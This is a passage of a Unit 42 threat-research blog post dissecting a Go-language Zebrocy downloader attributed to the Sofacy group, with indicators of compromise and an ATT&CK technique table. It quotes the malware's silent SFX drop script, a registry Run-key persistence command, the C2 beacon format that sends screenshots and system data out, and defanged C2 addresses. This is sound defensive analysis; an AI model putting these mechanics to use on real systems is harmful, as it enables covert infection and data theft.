<p style="text-align: center"><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy4-300x247.png" rel="wpdevart_lightbox"><img class=" wp-image-95931 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy4-300x247.png" alt="" width="446" height="368" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy4-300x247.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy4-900x741.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy4-768x632.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy4-370x305.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy4.png 974w" sizes="(max-width: 446px) 100vw, 446px" /></a><em>Figure 4 Statistics on visitors to the shortened link used to point to remote template (Accessed December 5, 2018)</em></p>
<p>&nbsp;</p>
<p>The remote template downloaded via this shortened link contains a macro similar to other Dear Joohn samples. The macro differs as it extracts a ZIP from the remote template file (<span style="font-family: courier new, courier, monospace">SHA256: c817aab6e8dcaeaeae817a85ba209c0ca690be58b91e6cff0e3f0660336f9506</span>) and saves it to a file named driver_pack.zip. The archive contains an executable named <span style="font-family: courier new, courier, monospace">driver_pack.exe</span> (<span style="font-family: courier new, courier, monospace">SHA256: b48b3d46ebfa6af8a25c007f77e6ed3c32fe4c6478311b8b0c7d6f4f8c82de76</span>), which is a WinRAR SFX executable archive that contains another executable named <span style="font-family: courier new, courier, monospace">comsvc.exe</span>. The WinRAR SFX archive extracts the <span style="font-family: courier new, courier, monospace">comsvc.exe</span> payload using the following SFX script:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">Path=%APPDATA%\AppHistory</span></p>
<p><span style="font-family: courier new, courier, monospace">Setup=comsvc.exe</span></p>
<p><span style="font-family: courier new, courier, monospace">Silent=1</span></p>
<p><span style="font-family: courier new, courier, monospace">Overwrite=2</span></p>
<p>&nbsp;</p>
<p>The <span style="font-family: courier new, courier, monospace">comsvc.exe</span> executable (<span style="font-family: courier new, courier, monospace">SHA256: 93680d34d798a22c618c96dec724517829ec3aad71215213a2dcb1eb190ff9fa</span>) is a UPX packed variant of the Go Zebrocy malware (<span style="font-family: courier new, courier, monospace">SHA256: 15a866c3c18046022a810aa97eaf2e20f942b8293b9cb6b4d5fb7746242c25b7</span>), which is a downloader responsible for obtaining and executing secondary payloads from a C2 server.</p>
<p>Like other Zebrocy variants, this Go Zebrocy malware checks the path of the running process to make sure it contains <span style="font-family: courier new, courier, monospace">comsvc</span>, as it would if executed by the delivery document that would eventually save the payload to <span style="font-family: courier new, courier, monospace">comsvc.exe</span>. If the Go Zebrocy sample was not run as <span style="font-family: courier new, courier, monospace">comsvc.exe</span>, it will send an HTTP POST request to <span style="font-family: courier new, courier, monospace">google[.]com</span> unlike other Zebrocy variants that will just exit, which we believe this is an attempt to further evade heuristic detection. Figure 5 shows the HTTP request sent to <span style="font-family: courier new, courier, monospace">google[.]com</span>.</p>
<p>&nbsp;</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy5-300x65.png" rel="wpdevart_lightbox"><img class=" wp-image-95930 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy5-300x65.png" alt="" width="647" height="140" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy5-300x65.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy5-900x196.png 900w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy5-768x167.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy5-370x81.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy5.png 974w" sizes="(max-width: 647px) 100vw, 647px" /></a><em>Figure 5 HTTP POST to google.com in the event Go Zebrocy executes with incorrect filename</em></p>
<p>&nbsp;</p>
<p>The data sent in the HTTP POST request in Figure 5 decodes to <span style="font-family: courier new, courier, monospace">&lt;#0&gt;0&lt;##0&gt;&lt;#1&gt;1&lt;##1&gt;&lt;#2&gt;1&lt;##2&gt;</span>, which does not necessarily have any purpose other than filling the same HTTP POST data delimiters that Go Zebrocy will use when communicating with the C2. In the event that the sample was run as <span style="font-family: courier new, courier, monospace">comsvc.exe</span>, the Trojan will reach out to the following URL to communicate with its C2 server:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">hxxp://89.37.226[.]123/advance/portable_version/service.php</span></p>
<p>&nbsp;</p>
<p>The Go Zebrocy tool will get the volume serial number, take a screenshot of the system (<a href="https://attack.mitre.org/techniques/T1113/">T1113</a>) and gather system specific information using a legitimate library called psutil that is available on <a href="https://github.com/shirou/gopsutil">Github</a>. The Trojan will call the <code><a href="https://github.com/shirou/gopsutil/blob/master/host/host_windows.go#L52">Host Info</a></code> function from the psutil library that will effectively gather platform information (operating system, version etc.), the time the system was booted, the system uptime, the system’s GUID, and process IDs for running processes (<a href="https://attack.mitre.org/techniques/T1057/">T1057</a>). The Zebrocy variant will send an HTTP POST request (<a href="https://attack.mitre.org/techniques/T1071/">T1071</a>) to the above URL with post data structured as follows:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">project=%3C%230%3E4D291F48%3C%23%230%3E%3C%231%3E[serial number of storage volume]%3C%23%230%3E%3C%231%3E[gathered system information]%3C%23%231%3E%3C%232%3E[screenshot in JPEG format]%3C%23%232%3E</span></p>
<p>&nbsp;</p>
<p>The hexadecimal characters in the HTTP POST data are used as delimiters, which represent the following:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">&lt;#0&gt;[serial number of storage volume]&lt;##0&gt;&lt;#1&gt;[gathered system information]&lt;##1&gt;&lt;#2&gt;[screenshot in JPEG format]&lt;##2&gt;</span></p>
<p>&nbsp;</p>
<p>The C2 will respond to the above request with a hexadecimal encoded payload that the Trojan will save to the system and execute. The Trojan writes the secondary payload to the following file:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">%LOCALAPPDATA%\Microsoft\Feeds\{5588ACFD-6436-411B-A5CE-666AE6A92D3D}~\wcncsvc.exe</span></p>
<p>&nbsp;</p>
<p>Before executing the dropped file, the Trojan will create an auto run registry key (<a href="https://attack.mitre.org/techniques/T1060/">T1060</a>) to have the secondary payload run each time the user logs in using the following command line (<a href="https://attack.mitre.org/techniques/T1059/">T1059</a>):</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">reg add HKCU\Software\Microsoft\Windows\CurrentVersion\Run /v Media Center Extender Service</span></p>
<p>&nbsp;</p>
<p>During our analysis, the secondary payload downloaded from the C2 is another Trojan written in Go language (<span style="font-family: courier new, courier, monospace">SHA256: 50d610226aa646dd643fab350b48219626918305aaa86f9dbd356c78a19204cc</span>), which the actors packed with UPX (<span style="font-family: courier new, courier, monospace">SHA256: ee9218a451c455fbca45460c0a27e1881833bd2a05325ed60f30bd4d14bb2fdc</span>) (<a href="https://attack.mitre.org/techniques/T1045/">T1045</a>). This secondary payload is another downloader that uses HTTPS instead of HTTP for its C2 communications. This secondary payload communicates with the following URL as its C2:</p>
<p>&nbsp;</p>
<p><span style="font-family: courier new, courier, monospace">hxxps://190.97.167[.]186/pkg/image/do.php</span></p>
<p>&nbsp;</p>
<p>The HTTP POST request sent via HTTPS will look as follows, specifically including the first four bytes of the volume serial number and the first four characters of the hostname within the post data in a field labeled &#8220;l&#8221; as seen in Figure 6.</p>
<p>&nbsp;</p>
<p><a href="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy6-300x107.png" rel="wpdevart_lightbox"><img class="wp-image-95935 aligncenter" src="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy6-300x107.png" alt="" width="443" height="158" srcset="https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy6-300x107.png 300w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy6-768x275.png 768w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy6-370x133.png 370w, https://unit42.paloaltonetworks.com/wp-content/uploads/2018/12/Zebrocy6.png 818w" sizes="(max-width: 443px) 100vw, 443px" /></a><em>Figure 6 HTTP beacon sent by the secondary payload within its HTTPS C2 channel</em></p>
<p>&nbsp;</p>
<p><strong>Conclusion</strong></p>
<p>The Sofacy group continues to use variants of the Zebrocy payload in its attack campaigns. Developers of Zebrocy continue to create new variants of the Trojan using different coding languages, which in this particular case used the Go language. The adversaries made some drastic errors to the delivery LNK shortcut, which made this attack seemingly ineffective. Regardless of the attack’s effectiveness, the techniques and indicators we observed still provide analytical points for correlation and should be included in an organizations security defenses as the group may use the payload and infrastructure in future attacks. It is also apparent that the Sofacy group will use these new variants of Zebrocy across multiple different campaigns, as the Go variant of Zebrocy was delivered via the LNK shortcut and a Dear Joohn delivery document.</p>
<p>Palo Alto customers can protect themselves against this threat by:</p>
<ul>
<li>Using a file blocking profile on our next-gen firewall to block LNK shortcuts sent via email. Please reference the following knowledge base article for more information on how to configure this capability: <a href="https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClT8CAK">https://knowledgebase.paloaltonetworks.com/KCSArticleDetail?id=kA10g000000ClT8CAK</a></li>
<li>Threat Prevention customers are protected by the <a href="https://threatvault.paloaltonetworks.com/?query=Zebrocy.Gen%20Command%20And%20Control%20Traffic&amp;type=anti-spyware-signatures">Gen Command And Control Traffic</a></li>
<li>AutoFocus customers can track this Zebrocy variant via the <a href="https://autofocus.paloaltonetworks.com/#/tag/Unit42.Zebrocy">Zebrocy</a></li>
</ul>
<p>&nbsp;</p>
<p><strong>Indicators of Compromise</strong></p>
<p>&nbsp;</p>
<p><strong>Zebrocy Go variant</strong></p>
<p>fcf03bf5ef4babce577dd13483391344e957fd2c855624c9f0573880b8cba62e</p>
<p>93680d34d798a22c618c96dec724517829ec3aad71215213a2dcb1eb190ff9fa</p>
<p>&nbsp;</p>
<p><strong>Zebrocy Go C2</strong></p>
<p>hxxp://89.37.226[.]148/technet-support/library/online-service-description.php</p>
<p>89.37.226[.]148</p>
<p>hxxp://89.37.226[.]123/advance/portable_version/service.php</p>
<p>89.37.226[.]123</p>
<p>&nbsp;</p>
<p><strong>Related Zebrocy Samples</strong></p>
<p>de31a8a9110b32a82843e9216a3378cc1c5ea972a6bb2261ec111efb82f31e71</p>
<p>daf990f0b6564c3ac87fa87e325e6ffc907ed43ae65a3f088a42b5b120612593</p>
<p>308b41db9e3b332bb5b3e5ec633907761eac5082029b8b32e6b063b8c76b7365</p>
<p>f93b89a707c647ba492efe4515bb69a627ce14f35926ee4147e13d2e030ab55b</p>
<p>1ff4e56419ad1814726ca143fc256cca4c8588605536c48dd79cfed12cb0763a</p>
<p>&nbsp;</p>
<p><strong>Dear Joohn Related Hashes</strong></p>
<p>346e5dc097b8653842b5b4acfad21e223b7fca976fb82b8c10d9fa4f3747dfa0 &#8211; Delivery Document</p>
<p>07646dc0a8c8946bb78be9b96147d4327705c1a3c3bd3fbcedab32c43d914305 &#8211; Remote Template</p>
<p>c817aab6e8dcaeaeae817a85ba209c0ca690be58b91e6cff0e3f0660336f9506 &#8211; ZIP in Remote Template</p>
<p>b48b3d46ebfa6af8a25c007f77e6ed3c32fe4c6478311b8b0c7d6f4f8c82de76 &#8211; WinRAR SFX in ZIP</p>
<p>93680d34d798a22c618c96dec724517829ec3aad71215213a2dcb1eb190ff9fa &#8211; Go Zebrocy sample</p>
<p>50d610226aa646dd643fab350b48219626918305aaa86f9dbd356c78a19204cc &#8211; Secondary payload</p>
<p>&nbsp;</p>
<p><strong>Dear Joohn Related URLs</strong></p>
<p>hxxps://bit[.]ly/2G8QrgL &#8211; Remote Template Shortened Link</p>
<p>hxxp://89.37.226[.]123/Templates/NormalOld.dotm &#8211; Remote Template URL</p>
<p>hxxp://89.37.226[.]123/advance/portable_version/service.php &#8211; Go Zebrocy HTTP C2</p>
<p>hxxps://190.97.167[.]186/pkg/image/do.php &#8211; Secondary payload HTTPS C2</p>
<p>&nbsp;</p>
<p><strong>Secondary Payload Hash</strong></p>
<p>50d610226aa646dd643fab350b48219626918305aaa86f9dbd356c78a19204cc</p>
<p>&nbsp;</p>
<p><strong>Secondary Payload C2</strong></p>
<p>hxxps://190.97.167[.]186/pkg/image/do.php</p>
<p>190.97.167[.]186</p>
<p>&nbsp;</p>
<p><strong>ATT&amp;CK Techniques Observed</strong></p>
<table>
<tbody>
<tr>
<td width="63"><strong>ID</strong></td>
<td width="312"><strong>Technique</strong></td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1193/">T1193</a></td>
<td width="312">Spearphishing Attachment</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1059/">T1059</a></td>
<td width="312">Command-Line Interface</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1086/">T1086</a></td>
<td width="312">PowerShell</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1140/">T1140</a></td>
<td width="312">Deobfuscate/Decode Files or Information</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1119/">T1119</a></td>
<td width="312">Automated Collection</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1071/">T1071</a></td>
<td width="312">Standard Application Layer Protocol</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1057/">T1057</a></td>
<td width="312">Process Discovery</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1082/">T1082</a></td>
<td width="312">System Information Discovery</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1120/">T1120</a></td>
<td width="312">Peripheral Device Discovery</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1047/">T1047</a></td>
<td width="312">Windows Management Instrumentation</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1113/">T1113</a></td>
<td width="312">Screen Capture</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1105/">T1105</a></td>
<td width="312">Remote File Copy</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1102/">T1102</a></td>
<td width="312">Web Service</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1204/">T1204</a></td>
<td width="312">User Execution</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1060/">T1060</a></td>
<td width="312">Registry Run Keys / Startup Folder</td>
</tr>
<tr>
<td width="63"><a href="https://attack.mitre.org/techniques/T1045/">T1045</a></td>
<td width="312">Software Packing</td>
</tr>
</tbody>
</table>
<p>&nbsp;</p>
          <div class="article__subscribe mb-40 text-gray-400 bg-gray-200 rounded-lg">
  <h4 class="h3 mb-10 text-black">Get updates from <br class="d-sm-none"> Palo Alto<br class="d-sm-none"> Networks!</h4>
  <p>Sign up to receive the latest news, cyber threat intelligence and research from us</p>
  <!-- <form action="https://app-guse4001.marketo.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe"> -->
  <form action="https://start.paloaltonetworks.com/index.php/leadCapture/save2" method="post" novalidate class="subscribe-form py-25" name="Unit42_Subscribe">
    <input type="hidden" value="1086" name="formid">
    <!-- <input type="hidden" value="818-CZC-273" name="munchkinId"> -->
    <input type="hidden" value="531-OCS-018" name="munchkinId">
    <input type="hidden" value="2141" name="lpId">
    <input type="hidden" value="1086" name="formVid">
    <input type="hidden" name="mkto_optinunit42" value="true">
    <input type="hidden" name="mkto_opt-in" value="true">
    <div class="row">
      <div class="col-sm col-12 mb-sm-0 mb-15">
        <input type="email" name="Email" placeholder="Email address" class="subscribe-field d-block w-100 px-sm-25 px-15 bg-white">
        <p class="error-mail d-none mt-15 text-danger" style="color: #dc3545">Please enter your email address!</p>
      </div>
      <div class="col-sm-auto col-12">
          <input type="submit" value="Subscribe" class="btn btn--black btn--sm w-100" disabled="disabled">
      </div>
    </div>

    <div class="google-recapth mt-15">
      <div class="g-recaptcha" data-expired-callback="captchaExpires" data-callback="captchaComplete" data-sitekey="6LfKOrwUAAAAAOwgjxrEcx-pcfwe8OquUw6ommTK"></div>
      <p class="error-recaptcha d-none mt-15 text-danger" style="color: #dc3545">Please mark, I'm not a robot!</p>
    </div>
  </form>

  <div class="font-size-ex-sm col-sm-7 p-0">
    <p>By submitting this form, you agree to our <a href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a> and acknowledge our <a href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy Statement</a>.</p>
  </div>
</div>

<script type="text/javascript" src="https://researchcenter.paloaltonetworks.com/wp-content/plugins/google-analyticator/external-tracking.min.js?ver=6.4.9"></script>
        </div>
      </div>
    </div>
  </article>
<footer class="site-footer px-sm-0 px-15">
  <div class="pt-40">
    <div class="container pt-sm-30">
      <div class="row justify-content-lg-center">
        <div class="col-lg-11 col-12">
          <div class="row">
            <div class="col-lg-4 col-sm-3 col-12 order-sm-2">
              <nav class="footer-socials mb-sm-0 mb-25 text-white text-sm-right">
                                                <a href="https://twitter.com/Unit42_Intel" target="_blank"><span class="ui ui-4"></span></a>
                <a href="https://github.com/pan-unit42" target="_blank"><span class="ui ui-5"></span></a>
              </nav>
            </div>

            <div class="col-lg-8 col-sm-9 col-12 order-sm-1">
              <div class="row">
                <div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Popular Resources</h4><div class="menu-footer-company-phase-container"><ul id="menu-footer-company-phase" class="menu"><li id="menu-item-97096" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97096"><a target="_blank" href="https://www.paloaltonetworks.com/resources">Resource Center</a></li>
<li id="menu-item-97097" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97097"><a target="_blank" href="https://researchcenter.paloaltonetworks.com/">Blog</a></li>
<li id="menu-item-97098" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97098"><a target="_blank" href="https://www.paloaltonetworks.com/communities">Communities</a></li>
<li id="menu-item-97099" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97099"><a target="_blank" href="https://docs.paloaltonetworks.com/">Tech Docs</a></li>
<li id="menu-item-97100" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-home menu-item-97100"><a href="https://unit42.paloaltonetworks.com/">Unit 42</a></li>
<li id="menu-item-97101" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97101"><a target="_blank" href="https://www.paloaltonetworks.com/sitemap">Sitemap</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Legal Notices</h4><div class="menu-footer-legal-notices-phase-container"><ul id="menu-footer-legal-notices-phase" class="menu"><li id="menu-item-97093" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97093"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/privacy">Privacy</a></li>
<li id="menu-item-97094" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97094"><a target="_blank" href="https://www.paloaltonetworks.com/legal-notices/terms-of-use">Terms of Use</a></li>
<li id="menu-item-97095" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97095"><a target="_blank" href="https://www.paloaltonetworks.com/legal">Documents</a></li>
</ul></div></div><div class="col-sm col-12 footer-widget widget_nav_menu"><h4 class="h6 mb-15 font-weight-black">Account</h4><div class="menu-footer-trending-topics-phase-container"><ul id="menu-footer-trending-topics-phase" class="menu"><li id="menu-item-97102" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97102"><a href="https://start.paloaltonetworks.com/preference-center">Manage Subscriptions</a></li>
<li id="menu-item-97103" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97103"><a href="#">&nbsp;</a></li>
<li id="menu-item-97104" class="menu-item menu-item-type-custom menu-item-object-custom menu-item-97104"><a href="https://www.paloaltonetworks.com/security-disclosure">Report a Vulnerability</a></li>
</ul></div></div>              </div>
            </div>
          </div>

          
            <div class="copyrights py-25 mt-40">
               <p>© 2020 Palo Alto Networks, Inc. All rights reserved.</p>
            </div>
          
        </div>
      </div>
    </div>
  </div>
</footer>
    <script type="text/javascript">
	var isProcessing = false; 
    function alter_ul_post_values(obj,post_id,ul_type){
	
		if (isProcessing)    
		return;  
		isProcessing = true;   
		
		jQuery(obj).find("span").html("..");
                jQuery.ajax({
                    type: "POST",
                    url: "https://unit42.paloaltonetworks.com/wp-content/plugins/like-dislike-counter-for-posts-pages-and-comments/ajax_counter.php",
                    data: "post_id="+post_id+"&up_type="+ul_type,
                    success: function(msg){
                            jQuery(obj).find("span").html(msg);
                            isProcessing = false; 
                            jQuery(obj).find('svg').children('path').attr('stroke','#0050FF');
                            jQuery(obj).removeClass('idc_ul_cont_not_liked idc_ul_cont_not_liked_inner');
                    }
 		});
	}
	</script>
            <script type="text/javascript">
            (function(){
                document.addEventListener('DOMContentLoaded', function(){
                    let wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                    if ( wpp_widgets ) {
                        for (let i = 0; i < wpp_widgets.length; i++) {
                            let wpp_widget = wpp_widgets[i];
                            WordPressPopularPosts.theme(wpp_widget);
                        }
                    }
                });
            })();
        </script>
                <script>
            var WPPImageObserver = null;

            function wpp_load_img(img) {
                if ( ! 'imgSrc' in img.dataset || ! img.dataset.imgSrc )
                    return;

                img.src = img.dataset.imgSrc;

                if ( 'imgSrcset' in img.dataset ) {
                    img.srcset = img.dataset.imgSrcset;
                    img.removeAttribute('data-img-srcset');
                }

                img.classList.remove('wpp-lazyload');
                img.removeAttribute('data-img-src');
                img.classList.add('wpp-lazyloaded');
            }

            function wpp_observe_imgs(){
                let wpp_images = document.querySelectorAll('img.wpp-lazyload'),
                    wpp_widgets = document.querySelectorAll('.popular-posts-sr');

                if ( wpp_images.length || wpp_widgets.length ) {
                    if ( 'IntersectionObserver' in window ) {
                        WPPImageObserver = new IntersectionObserver(function(entries, observer) {
                            entries.forEach(function(entry) {
                                if (entry.isIntersecting) {
                                    let img = entry.target;
                                    wpp_load_img(img);
                                    WPPImageObserver.unobserve(img);
                                }
                            });
                        });

                        if ( wpp_images.length ) {
                            wpp_images.forEach(function(image) {
                                WPPImageObserver.observe(image);
                            });
                        }

                        if ( wpp_widgets.length ) {
                            for (var i = 0; i < wpp_widgets.length; i++) {
                                let wpp_widget_images = wpp_widgets[i].querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widgets[i].shadowRoot ) {
                                    wpp_widget_images = wpp_widgets[i].shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    wpp_widget_images.forEach(function(image) {
                                        WPPImageObserver.observe(image);
                                    });
                                }
                            }
                        }
                    } /** Fallback for older browsers */
                    else {
                        if ( wpp_images.length ) {
                            for (var i = 0; i < wpp_images.length; i++) {
                                wpp_load_img(wpp_images[i]);
                                wpp_images[i].classList.remove('wpp-lazyloaded');
                            }
                        }

                        if ( wpp_widgets.length ) {
                            for (var j = 0; j < wpp_widgets.length; j++) {
                                let wpp_widget = wpp_widgets[j],
                                    wpp_widget_images = wpp_widget.querySelectorAll('img.wpp-lazyload');

                                if ( ! wpp_widget_images.length && wpp_widget.shadowRoot ) {
                                    wpp_widget_images = wpp_widget.shadowRoot.querySelectorAll('img.wpp-lazyload');
                                }

                                if ( wpp_widget_images.length ) {
                                    for (var k = 0; k < wpp_widget_images.length; k++) {
                                        wpp_load_img(wpp_widget_images[k]);
                                        wpp_widget_images[k].classList.remove('wpp-lazyloaded');
                                    }
                                }
                            }
                        }
                    }
                }
            }

            document.addEventListener('DOMContentLoaded', function() {
                wpp_observe_imgs();

                // When an ajaxified WPP widget loads,
                // Lazy load its images
                document.addEventListener('wpp-onload', function(){
                    wpp_observe_imgs();
                });
            });
        </script>
        <link rel='stylesheet' id='wpdevart_lightbox_front_end_css-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/wpdevart_lightbox_front.css?ver=5.4.1' type='text/css' media='all' />
<link rel='stylesheet' id='wpdevart_lightbox_effects-css'  href='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/style/effects_lightbox.css?ver=5.4.1' type='text/css' media='all' />
<script type='text/javascript' src='https://www.google.com/recaptcha/api.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/themes/unit42-v4/dist/scripts/main.js'></script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-includes/js/wp-embed.min.js?ver=5.4.1'></script>
<script type='text/javascript'>
/* <![CDATA[ */
var wpdevart_lb_variables = {"eneble_lightbox_content":"enable","overlay_transparency_prancent":"80","popup_background_color":"#000000","popup_loading_image":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/popup_loading.png","popup_initial_width":"350","popup_initial_height":"300","popup_youtube_width":"640","popup_youtube_height":"410","popup_vimeo_width":"500","popup_vimeo_height":"410","popup_max_width":"5000","popup_max_height":"5000","popup_position":"5","popup_fixed_position":"true","popup_outside_margin":"0","popup_border_width":"2","popup_border_color":"#000000","popup_border_radius":"10","control_buttons_show":"true","control_buttons_show_in_content":"false","control_buttons_height":"30","control_buttons_line_bg_color":"#000000","control_button_prev_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev.png","control_button_prev_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/prev_hover.png","control_button_next_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next.png","control_button_next_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/next_hover.png","control_button_download_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download.png","control_button_download_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/download_hover.png","control_button_innewwindow_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow.png","control_button_innewwindow_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/innewwindow_hover.png","control_button_fullwidth_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth.png","control_button_fullwidht_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidth_hover.png","control_button_fullwidthrest_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset.png","control_button_fullwidhtrest_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/fullwidthreset_hover.png","control_button_close_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close.png","control_button_close_hover_img_src":"https:\/\/unit42.paloaltonetworks.com\/wp-content\/plugins\/lightbox-popup\/images\/contorl_buttons\/close_hover.png","information_panel_show":"false","information_panel_show_in_content":"false","information_panel_bg_color":"#000000","information_panel_default_transparency":"100","information_panel_hover_trancparency":"100","information_panel_count_image_after_text":"Image","information_panel_count_image_middle_text":"of","information_panel_count_padding_left":"15","information_panel_count_padding_right":"4","information_panel_count_font_size":"20","information_panel_desc_padding_left":"15","information_panel_desc_padding_right":"4","information_panel_desc_font_size":"20","information_panel_desc_show_if_not":"true","information_panel_text_for_no_caption":"No Caption","information_panel_title_padding_left":"5","information_panel_title_padding_right":"5","information_panel_title_font_size":"15","information_panel_title_show_if_not":"true","information_panel_text_for_no_title":"No Title","information_panel_ordering":"{\"count\":[1,\"count\"],\"title\":[0,\"title\"],\"caption\":[0,\"caption\"]}"};
/* ]]> */
</script>
<script type='text/javascript' src='https://unit42.paloaltonetworks.com/wp-content/plugins/lightbox-popup/includes/javascript/wpdevart_lightbox_front.js?ver=1.0'></script>
          
  </body>
</html>
